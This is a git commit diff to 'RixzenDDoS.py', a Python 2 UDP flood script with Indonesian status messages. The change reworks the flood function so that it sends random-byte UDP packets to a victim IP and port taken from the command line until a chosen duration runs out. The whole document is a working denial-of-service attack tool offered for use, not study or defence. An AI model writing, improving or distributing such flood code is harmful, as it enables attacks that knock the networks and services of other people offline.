37f3a497d140ecb4d515f2446ca81ad1cb6b120f
MathoCraft <37491414+MathoCraft@users.noreply.github.com>
2021-08-12 12:03:30 +0700

    Add files via upload

--- RixzenDDoS.py
+++ RixzenDDoS.py
@@ -12,24 +12,26 @@ def usage():
     print "#\033[1;91mVersion: 1.0        \033[1;32m##     #      #                                 ##"
     print "#\033[1;91mTQAdmin: MrNath, MrTod, MrPrek                                      \033[1;32m##"
     print "#######################################################################"
-def flood(victim, vport, packets, duration):
+def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(10000000)
     timeout =  time.time() + duration
     sent = 100000
+
     while 1:
         if time.time() > timeout:
             break
         else:
             pass
-            client.sendto(bytes, (victim, vport))
-            sent = sent + 1
-            print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket ke ip: \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket ke \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
         usage()
     else:
         flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
 if __name__ == '__main__':
     main()
